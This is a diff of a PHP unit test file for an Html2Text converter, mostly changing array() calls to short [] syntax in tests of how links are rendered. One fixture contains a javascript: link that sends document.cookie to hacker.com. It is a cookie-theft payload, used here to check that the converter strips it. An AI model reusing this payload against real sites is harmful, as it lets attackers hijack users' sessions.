@@ -34,7 +34,7 @@ Links:
 [2] http://example.com
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'table'));
+    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'table']);
     $output = $html2text->getText();
 
     self::assertSame($this->normalizeString($expected), $output);
@@ -50,7 +50,7 @@ Link text [http://example.com]
 Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'inline'));
+    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'inline']);
     $output = $html2text->getText();
 
     self::assertSame($this->normalizeString($expected), $output);
@@ -66,7 +66,7 @@ foo [url=http://example.com?guid=[[PALCEHOLDER]]&foo=bar&{{foobar}}]Link text[/u
 Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'bbcode'));
+    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'bbcode']);
     $output = $html2text->getText();
 
     self::assertSame($this->normalizeString($expected), $output);
@@ -82,7 +82,7 @@ Link text
 Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'none'));
+    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'none']);
     $output = $html2text->getText();
 
     self::assertSame($this->normalizeString($expected), $output);
@@ -100,7 +100,7 @@ Link text
 Fritz Eierschale, fritz.eierschale@example.org
 EOT;
 
-    $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'nextline'));
+    $html2text = new Html2Text(self::TEST_HTML, ['do_links' => 'nextline']);
     $output = $html2text->getText();
 
     self::assertSame($this->normalizeString($expected), $output);
@@ -142,7 +142,7 @@ Links:
 [1] http://lall.com
 EOT;
 
-    $html2text = new Html2Text($html, array('do_links' => 'table'));
+    $html2text = new Html2Text($html, ['do_links' => 'table']);
     $output = $html2text->getText();
 
     self::assertSame($this->normalizeString($expected), $output);
@@ -185,7 +185,7 @@ EOT;
     $html = '<a href="/relative">Link text</a>';
     $expected = 'Link text [http://example.com/relative]';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
     $html2text->setBaseUrl('http://example.com');
 
     self::assertSame($expected, $html2text->getText());
@@ -196,7 +196,7 @@ EOT;
     $html = '<a href="/relative">Link text</a>';
     $expected = 'Link text [http://example.com/relative]';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
     $html2text->setBaseUrl('http://example.com');
 
     self::assertSame($expected, $html2text->getText());
@@ -218,7 +218,7 @@ Foo Bar Example, foo.bar@example.org
 Link text
 Link text [/]';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
     self::assertSame($this->normalizeString($expected), $html2text->getText());
   }
@@ -228,7 +228,7 @@ Link text [/]';
     $html = '<a href="/relative">Link text</a>';
     $expected = 'Link text [%baseurl%/relative]';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
     $html2text->setBaseUrl('%baseurl%');
 
     self::assertSame($expected, $html2text->getText());
@@ -239,7 +239,7 @@ Link text [/]';
     $html = '<b><a href="http://example.com">Link text</a></b>';
     $expected = 'LINK TEXT [http://example.com]';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
     self::assertSame($expected, $html2text->getText());
   }
@@ -249,7 +249,7 @@ Link text [/]';
     $html = '<a href="http://example.com"><b>Link text</b></a>';
     $expected = 'LINK TEXT [http://example.com]';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
     self::assertSame($expected, $html2text->getText());
   }
@@ -259,7 +259,7 @@ Link text [/]';
     $html = '<ahref="#">Broken Link text</a>';
     $expected = 'Broken Link text';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
     self::assertSame($expected, $html2text->getText());
   }
@@ -269,7 +269,7 @@ Link text [/]';
     $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
     $expected = 'Link text';
 
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
 
     self::assertSame($expected, $html2text->getText());
   }
@@ -278,9 +278,9 @@ Link text [/]';
   {
     $html = '<a href="http://example.com">http://example.com</a>';
     $expected = 'http://example.com';
-    $html2text = new Html2Text($html, array('do_links' => 'inline'));
+    $html2text = new Html2Text($html, ['do_links' => 'inline']);
     $this->assertEquals($expected, $html2text->getText());
-    $html2text = new Html2Text($html, array('do_links' => 'nextline'));
+    $html2text = new Html2Text($html, ['do_links' => 'nextline']);
     $this->assertEquals($expected, $html2text->getText());
   }
 
@@ -291,6 +291,6 @@ Link text [/]';
    */
   protected function normalizeString($string)
   {
-    return str_replace(array("\r\n", "\r"), "\n", $string);
+    return str_replace(["\r\n", "\r"], "\n", $string);
   }
 }
